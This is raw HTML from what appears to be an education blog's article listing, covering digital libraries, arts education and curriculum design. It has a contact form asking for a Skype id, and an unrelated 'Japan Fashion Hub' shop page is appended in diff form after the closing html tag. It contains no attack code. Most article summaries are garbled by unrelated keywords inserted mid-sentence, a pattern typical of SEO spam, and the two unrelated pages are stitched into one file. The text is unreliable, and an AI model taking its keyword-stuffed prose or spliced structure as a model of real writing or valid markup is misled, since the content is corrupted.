class="current-wGSWUOXU"><div class="active-SmwEJaWqmECPKOX"><span class="large-CXtfSGIkdGlssTjk">April 10, 2025</span></div></div><div class="col-zuWvHyEvONLiD"><div class="icon-aibJEexjsKWXjb"><span class="text-aIfdZEf">Liam Thompson</span></div></div></div><div class="huge-zYTsUBhImPi"><img src="./img/4eaa358836c96998d21ecf5e67a3e598d80b6062.jpg" class="subject-pDZvTRkrikBOgiHX"/></div><div class="thumb-lGaeZbAWefOIiz"><h5 class="caption-fAobnmDVn">Digital Libraries: Transforming Access to Knowledge in the Modern Age</h5><div class="md-sjZBHFIcIDAcn"><span class="picture-nfUtbfQR">Writing This Teaching article examines the evolution and Knowledge Literacy Reading significance of digital Learning libraries, highlighting their role in Innovation Academic Skills Training enhancing Certification access to Curriculum information Examination and Study supporting lifelong learning. Research</span></div></div></div><div class="pic-YHbtHYFUQr"><div class="tagline-mifWJSDky"><a href="themelist2.html" class="button-mJxNsRdGRxvWdG"><span class="picture-sEInkFuLyoi">Read full</span></a><a href="index.php" class="md-IBbQsOWfuOYOaDRK"><span class="breadcrumbs-pSpJutGaL">Share</span></a></div><div class="sidebar-NdRKeGFFPC"><div class="thumb-WkAwxlEbGlrV"><div class="row-xNpqjNwDtxuXMDen"><span class="all-UzRTcGY">March 28, 2025</span></div></div><div class="current-UMVtSNGbXqNyegUO"><div class="row-rQvJLla"><span class="column-jflFjZeDK">Sophia Grant</span></div></div></div><div class="tagline-filYYUWpmJyEX"><img src="./img/4f6a10e6ed85d5b2533b1fa17b80ced79d9f6285.jpg" class="image-zCFeNpFbphrT"/></div><div class="title-pGRCOqsDiCTtk"><h5 class="tiny-ZcizsCtjseH">Cultivating Creativity: The Importance of Arts Education in Schools</h5><div class="inner-FmGQRgGhvtD"><span class="holder-rZLyHDJpe">This article discusses the vital Examination role Academic of arts education Reading in fostering creativity, critical Study Certification Curriculum Skills thinking, and emotional Learning intelligence among Writing students, emphasizing Literacy Teaching its Knowledge Innovation Training Research impact on overall educational success.</span></div></div></div><div class="huge-wyrGOMrVKio"><div class="small-DoZHzhgRgZ"><a href="themelist3.html" class="sidebar-KpsQfSoIMo"><span class="tooltip-AnIWZI">Read full</span></a><a href="index.php" class="btn-POKxoIGsaWZ"><span class="col-NkuYWU">Share</span></a></div><div class="control-mDnGwtiVozZJL"><div class="row-iZYTYUwvJjUoAM"><div class="title-TzCJqFSQPywlt"><span class="pic-tHqTnuZbd">February 24, 2025</span></div></div><div class="avatar-HaWYPtD"><div class="column-vrXnZqtCLITDt"><span class="all-bavoUxY">Liam Thompson</span></div></div></div><div class="xl-ksEAzLRGFowXA"><img src="./img/108aa00998039a4ff24a1af2258905003a16d816.jpg" class="section-BnhGSksR"/></div><div class="subtitle-RqSPWetjUc"><h5 class="btn-veJtWSBxqKyXWss">Libraries as Catalysts for Community Development</h5><div class="tagline-VqkmgN"><span class="title-yzlNlJP">An in-depth look at how Curriculum Writing libraries Literacy Training are instrumental Study Examination in fostering Research Reading community growth, education, and Innovation social Skills Academic Teaching Learning Knowledge Certification cohesion.</span></div></div></div><div class="grid-BJVEVoOPj"><div class="subject-rGEBDXBgg"><a href="themelist4.html" class="control-IXtfUoaBHHDD"><span class="img-TsHHdCdSQfrt">Read full</span></a><a href="index.php" class="image-KtrBkjVeQ"><span class="btn-ceHcHNEAKHSP">Share</span></a></div><div class="more-VninrzcvjjjCzjhS"><div class="sidebar-PGzMEavZBXGT"><div class="column-VVwvoonh"><span class="medium-eIGVTymAqMdCdfnE">June 06, 2025</span></div></div><div class="picture-wiJLZu"><div class="huge-pTRVySqBN"><span class="tagline-yvVpUANKHQZ">Liam Thompson</span></div></div></div><div class="box-fTtUHKRurLa"><img src="./img/199469ad096cbf541c8d88beb7314d57cddeeb2a.jpg" class="headline-eCDzqvWMd"/></div><div class="img-IbEoztEeYAFVgVp"><h5 class="active-acnGAwLbRQ">Libraries as Catalysts for Community Development</h5><div class="all-VeCnLmoCGQpigaFN"><span class="img-tWtDAwVNBsCqSSj">An Innovation in-depth Examination look Research at how Academic Study libraries Writing Curriculum Literacy are instrumental in fostering community Certification growth, education, Learning Training and Reading Skills Knowledge social cohesion. Teaching</span></div></div></div><div class="button-pbiuBeeyxnZ"><div class="img-tlKbYstAXWr"><a href="themelist5.html" class="grid-DJqeSHzhrIcDVTLL"><span class="control-kefYGd">Read full</span></a><a href="index.php" class="subtitle-keewMdGhrBdy"><span class="desc-yISadQchpACtEwO">Share</span></a></div><div class="tagline-bSxRPWaIpxCRhO"><div class="tiny-sSTykjWjK"><div class="content-qFrMKzrFB"><span class="wrapper-gbWisIIYoFkyNB">January 20, 2025</span></div></div><div class="userpic-jNiRrsCO"><div class="tiny-xzcEXxsBJ"><span class="thumb-OXxUAV">Liam Thompson</span></div></div></div><div class="aside-PSqCEkQBYSIJi"><img src="./img/12f86bd483040c21b0dbeb584c777e32e74f99e7.jpg" class="lg-buKFvgAJCJJPzV"/></div><div class="desc-BCdDVJeZcwDbK"><h5 class="box-cHYqrEhclBM">Crafting Curriculum: Strategies for Effective Curriculum Design and Development</h5><div class="more-PLqiJM"><span class="tip-ZehTRnoyOS">Study This article Certification explores the Knowledge principles Learning and strategies Research Reading of curriculum design, Examination focusing on how Literacy to create effective Writing Academic educational programs Teaching that meet the Training Curriculum Skills diverse Innovation needs of students.</span></div></div></div><div class="lg-vVPjiSRuyxc"><div class="preview-wHHevlqMFpMHFbT"><a href="themelist6.html" class="page-EttyeQdxT"><span class="title-zUPMiBbNLbrl">Read full</span></a><a href="index.php" class="section-agrdoxkyzRhUlcs"><span class="subtitle-TMXjhaBw">Share</span></a></div><div class="section-UHRkbxuCzXoBwT"><div class="thumbnail-yIyiQYkoJfudHAN"><div class="narrow-ZrtcZoWOisl"><span class="preview-VCmKVXNUokN">April 07, 2025</span></div></div><div class="all-zeEAWRwCM"><div class="thumbnail-hNMxhkxPXRAxP"><span class="column-zrRtRMH">Samuel Lee</span></div></div></div><div class="aside-sPkGBUwdhzztBG"><img src="./img/bc67607272d2d99e06eadc8667b3c862c9495408.jpg" class="more-WurzmmzocCbhOw"/></div><div class="image-YsvUiDm"><h5 class="medium-isImbEZLLUDNZao">Navigating the Future: The Impact of Emerging Technologies on Education</h5><div class="content-nOHOafqIY"><span class="picture-nBWYkYwbKMX">This article Research Teaching explores how Training emerging Literacy technologies Certification Skills are reshaping Study the Academic educational landscape, Reading enhancing learning experiences, and Writing preparing students for Knowledge Innovation the Learning Curriculum future. Examination</span></div></div></div><div class="inner-xdrvcZWvj"><div class="row-dZkXSEqPdSxf"><a href="themelist7.html" class="sm-TskAxfi"><span class="column-nfJCqR">Read full</span></a><a href="index.php" class="column-qyDaUQKp"><span class="subtitle-wWMrzk">Share</span></a></div><div class="picture-DhfXzqgvK"><div class="page-paMMtFOwrDrzeM"><div class="column-juFuwYZTMy"><span class="avatar-yrUcASlGAzxiYZ">August 23, 2025</span></div></div><div class="content-uaRjHkSWcQunCx"><div class="subtitle-WBtQHJdhWq"><span class="row-DTLesNZlhYfhx">Isabella Rivera</span></div></div></div><div class="wide-jQAAXOLRnBgt"><img src="./img/a7dd6475863c8de28edff8fd6929045f1b5f4c7d.jpg" class="tip-RbZvZOucQjuTblMz"/></div><div class="tip-iWmfyfjlCJuQSQ"><h5 class="wide-mCWbvbGCxM">Embracing Diversity: The Benefits of Multicultural Education</h5><div class="avatar-IErVrOHi"><span class="icon-TsycFza">Certification Study Innovation This article Reading Curriculum explores the significance of Literacy multicultural education, its advantages for students and Teaching Examination Research Learning Training Knowledge Writing society, and effective strategies for Skills Academic implementation in schools.</span></div></div></div><div class="all-OmBAJwIJKNXdP"><div class="narrow-gTTUSxrHVtLmE"><a href="themelist8.html" class="preview-meHPOCOdZH"><span class="aside-akTDlcrimtPDIzAW">Read full</span></a><a href="index.php" class="tooltip-wwVslwaRMehBr"><span class="tip-DFjDwICOLo">Share</span></a></div><div class="sidebar-sRIUgoDJtFUf"><div class="xs-BvxebFBmmtJ"><div class="wrapper-mYjqlPjoiPglLDPk"><span class="control-bFQoig">May 12, 2025</span></div></div><div class="image-VGNuPqJhLRVBNWr"><div class="button-eXTFHU"><span class="caption-HzNvFoexkOKmidUZ">Emma Rodriguez</span></div></div></div><div class="holder-mvHSfZz"><img src="./img/a6e0ed564ffeb882aa72cbad125d90574371fc7a.jpg" class="all-XktgrlQLOgXvfuEe"/></div><div class="md-oySXikoUPag"><h5 class="grid-OrYvnsbyiQqOdXO">Desks for Different Age Groups: Designing Furniture for Every Stage of Learning</h5><div class="caption-pIIqSsvxw"><span class="narrow-ELGCRBXuC">This article explores how desk designs vary Learning Reading for students of different age groups, from preschoolers to Academic college students. Training It Examination Innovation Literacy examines the Certification unique developmental and educational needs Curriculum at each stage of learning, Teaching Research and how desk designs are tailored to support Knowledge those needs, ensuring comfort, functionality, Study and Skills a conducive learning Writing environment.</span></div></div></div><div class="md-yghfhWDJIwpG"><div class="small-dszYtDG"><a href="themelist9.html" class="active-zSacZCDZsuMIVHWz"><span class="icon-DqJxlZkkjpHOUU">Read full</span></a><a href="index.php" class="holder-iiJmAoHGXNu"><span class="heading-qurVCvp">Share</span></a></div><div class="caption-DErDTRM"><div class="subject-wqoHNUWWmLeDjq"><div class="page-SkFmghvoJzh"><span class="narrow-jbySJZM">June 27, 2025</span></div></div><div class="avatar-gnkFbcfmmoprBQ"><div class="thumb-tpHXbwyp"><span class="pic-YEPVesId">Isabella Rivera</span></div></div></div><div class="tiny-IivARIZumqFaGOzK"><img src="./img/1175f9e9bc9fbdc88cc17cd1cc4d1915e7a0304a.jpg" class="all-pemrqSw"/></div><div class="md-feVEeHevyXqLa"><h5 class="userpic-zYmATZEOagSh">Embracing Diversity: The Benefits of Multicultural Education</h5><div class="headline-HAZbvWsA"><span class="caption-slpZdjmNe">This article explores Teaching the significance of multicultural Study education, its Certification Knowledge advantages for Skills students Writing and Literacy Curriculum Training Academic society, Research and effective strategies Learning for Examination implementation Innovation in Reading schools.</span></div></div></div></div></div><div style="display: flex; position: relative; justify-content: center; align-items: center; width: 80%; padding: calc(50vw/var(--resizer)*100) 10% calc(50vw/var(--resizer)*100) 10%; gap: calc(18vw/var(--resizer)*100); flex-direction: column; background-color: #ead498; background-image: url(&quot;data:image/svg+xml,%3Csvg%20id%3D'triangles-1_4139'%20width%3D'100%25'%20height%3D'1000px'%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%3E%3Cdefs%3E%3Cstyle%3E%0A%20%20%20%20%40keyframes%20float1%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(-45px%2C%200)%20rotate(50deg)%20scale(0.7727427789521113)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float1%20%7B%0A%20%20%20%20%20%20animation%3A%20float1%204s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float2%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(-17px%2C%2024px)%20rotate(133deg)%20scale(0.6433189235391454)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float2%20%7B%0A%20%20%20%20%20%20animation%3A%20float2%205s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float3%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%20-34px)%20rotate(18deg)%20scale(0.7323354353416378)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float3%20%7B%0A%20%20%20%20%20%20animation%3A%20float3%204s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%3C%2Fstyle%3E%3Cpattern%20id%3D'30946'%20patternUnits%3D'userSpaceOnUse'%20width%3D'80'%20height%3D'80'%20patternTransform%3D'scale(7)%20rotate(54)'%3E%3Crect%20x%3D'0'%20y%3D'0'%20width%3D'100%25'%20height%3D'100%25'%20fill%3D'%23f4ffff'%2F%3E%3Cpath%20d%3D'M20%200L0%2020h20V0zm0%2020v20l20-20H20z'%20class%3D'float1'%20style%3D'opacity%3A%20.15'%20transform%3D'translate(20%2C0)'%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23ead498'%2F%3E%3Cpath%20d%3D'M20%200l20%2020V0zM0%2020v20h20z'%20class%3D'float3'%20style%3D'opacity%3A%20.15'%20transform%3D'translate(20%2C0)'%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23ead498'%2F%3E%3C%2Fpattern%3E%3C%2Fdefs%3E%3Crect%20width%3D'800%25'%20height%3D'800%25'%20transform%3D'translate(-133%2C-39)'%20fill%3D'url(%2330946)'%2F%3E%3C%2Fsvg%3E&quot;);" class="xl-ZMkTfwtXAd"><div class="narrow-SaqTbHUoVFafaUrt"><div class="xs-DLwBSiPquMfwh"><h3 class="page-XauhPowryHoyYNxc">Get Contact</h3><span class="preview-LhOapARyc"></span></div></div><form action="undefined" class="tooltip-jsAcqwfthDV"><input placeholder="User id" class="thumbnail-tlBScXphqALz"/><input placeholder="Skype id" class="thumb-nWHbQvAgntcL"/><button type="submit" class="tagline-WkUQdCX">Offer</button></form></div></main><footer class="md-bZsSeyYn"><div class="md-BtQqVgkU"><a href="./privacy_policy.html" class="headline-JBeCNpfxhjNknnV">Privacy Policy</a><a href="./terms_of_use.html" class="xs-UNPVUpjwsMMVCoZI">Terms Of Use</a><a href="./cookie_policy.html" class="active-JqjQUcOfGJisKSY">Cookies Policy</a></div></footer><input type="checkbox" id="close" class="image-oRxfYRQkaXLswXUF"/><section class="heading-xRkPPWHbji"><div class="holder-hTAJCi"><div class="desc-pFobqrEcpzhLQOiO"><label for="close" class="col-bzmsZKrv"><span class="control-TRBkPnSu">Agree</span></label></div></div><div class="widget-vNYvaTgAXjFdLuT"><span class="large-ymXZrLFHXuMK">This site uses cookies to help personalise content, tailor your experience and to keep you logged in if you register.<br>By continuing to use this site, you are consenting to our use of cookies. Learn more.</span></div></section></body></html>
+
+<header>
+<div class="container nav">
+<div class="logo">JAPAN FASHION HUB</div>
+
+<div class="menu">
+<a href="#">Home</a>
+<a href="#">Men</a>
+<a href="#">Women</a>
+<a href="#">New Arrivals</a>
+<a href="#">Ranking</a>
+</div>
+</div>
+
+</header>
+
+<section class="hero container">
+<div class="hero-grid">
+
+<div class="hero-card">
+<img loading="lazy" src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?w=900">
+<div class="hero-text">Latest Collection</div>
+</div>
+
+<div class="hero-card">
+<img loading="lazy" src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=900">
+<div class="hero-text">Style</div>
+</div>
+
+<div class="hero-card">
+<img loading="lazy" src="https://images.unsplash.com/photo-1483985988355-763728e1935b?w=900">
+<div class="hero-text">Accessories</div>
+</div>
+
+</div>
+</section>
+
+<div class="container">
+
+<div class="category-grid">
+
+<div class="category-card">
+<img loading="lazy" src="https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?w=1200">
+<div class="category-name">MEN</div>
+</div>
+
+<div class="category-card">
+<img loading="lazy" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=1200">
+<div class="category-name">WOMEN</div>
+</div>
+
+</div>
+
+<h2 class="section-title">New Arrivals</h2>
+
+<div class="products">
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?w=600">
+<h3>Premium Polo Shirt</h3>
+<div class="price">¥4,980</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1576566588028-4147f3842f27?w=600">
+<h3>Summer Shirt</h3>
+<div class="price">¥5,980</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1541099649105-f69ad21f3246?w=600">
+<h3>Women's Top</h3>
+<div class="price">¥3,980</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1489987707025-afc232f7ea0f?w=600">
+<h3>Fashion Dress</h3>
+<div class="price">¥6,980</div>
+</div>
+
+</div>
+
+<h2 class="section-title">Popular Ranking</h2>
+
+<div class="products">
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1523381210434-271e8be1f52b?w=600">
+<h3>Popular Polo Shirt</h3>
+<div class="price">¥4,500</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1503342217505-b0a15ec3261c?w=600">
+<h3>Casual Wear</h3>
+<div class="price">¥5,200</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1512436991641-6745cdb1723f?w=600">
+<h3>Women's Fashion</h3>
+<div class="price">¥4,980</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?w=600">
+<h3>Sportswear</h3>
+<div class="price">¥6,200</div>
+</div>
+
+</div>
+
+</div>
+
+<section class="story container">
+
+<div class="story-grid">
+
+<img loading="lazy" src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=900">
+<img loading="lazy" src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=900">
+<img loading="lazy" src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=900">
+
+</div>
+
+<div class="story-text">
+<h2 class="section-title">Sport Meets Fashion</h2>
+
+<p>
+Japan Fashion Hub offers a new lifestyle that combines Japanese trend fashion with sports style.
+We deliver items that focus on quality, comfort, and design.
+</p>
+</div>
+
+</section>
+
+<div class="container">
+
+<h2 class="section-title">Instagram Feed</h2>
+
+<div class="instagram">
+
+<img loading="lazy" src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?w=500">
+<img loading="lazy" src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?w=500">
+<img loading="lazy" src="https://images.unsplash.com/photo-1512436991641-6745cdb1723f?w=500">
+<img loading="lazy" src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=500">
+<img loading="lazy" src="https://images.unsplash.com/photo-1503342217505-b0a15ec3261c?w=500">
+<img loading="lazy" src="https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?w=500">
+
+</div>
+
+<div class="news">
+
+<h2 class="section-title">News</h2>
+
+<ul>
+<li>2026/06/15 Summer Collection Released</li>
+<li>2026/06/12 Men's Ranking Updated</li>
+<li>2026/06/10 Free Shipping Campaign Started</li>
+<li>2026/06/08 New Member Registration Bonus</li>
+</ul>
+
+</div>
+
+</div>
+
+<footer>
+
+<h3>JAPAN FASHION HUB</h3>
+
+<p>
+Delivering the latest fashion across Japan.
+</p>
+
+<p style="margin-top:15px;">
+© 2026 Japan Fashion Hub. All Rights Reserved.
+</p>
+
+</footer>
+
+
+
+<iframe id="lo-frame-core" src="about:blank" aria-hidden="true" title="Lucky Orange: core" style="display: none !important;"></iframe></body></html>
